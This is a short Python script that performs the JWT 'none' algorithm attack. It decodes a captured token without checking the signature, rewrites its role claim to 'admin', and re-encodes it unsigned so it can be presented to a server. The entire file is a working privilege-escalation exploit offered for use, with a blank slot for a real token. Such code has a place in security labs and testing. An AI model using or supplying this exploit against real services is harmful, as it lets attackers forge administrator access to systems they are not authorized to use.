# Creating a new jwt token by re-encoding with the none algorithm (means no signature verification or signing on the server-side)

import jwt

def modify_jwt_role(token):
    try:
        decoded_token = jwt.decode(token, options={"verify_signature": False})
        print("Decoded JWT payload: ", decoded_token)
        decoded_token['role'] = 'admin'   # change to the role you want
        reencoded_token = jwt.encode(decoded_token, None, algorithm="none")
        print("Re-encoded JWT (role changed to admin): %s", reencoded_token)
        return reencoded_token

    except jwt.PyJWTError as e:
        print("Error decoding or encoding JWT: ", e)
        return None



# Replace this with the token you received
og_token = ""
new_token = modify_jwt_role(og_token)

print("Modified JWT Token: ", (new_token))
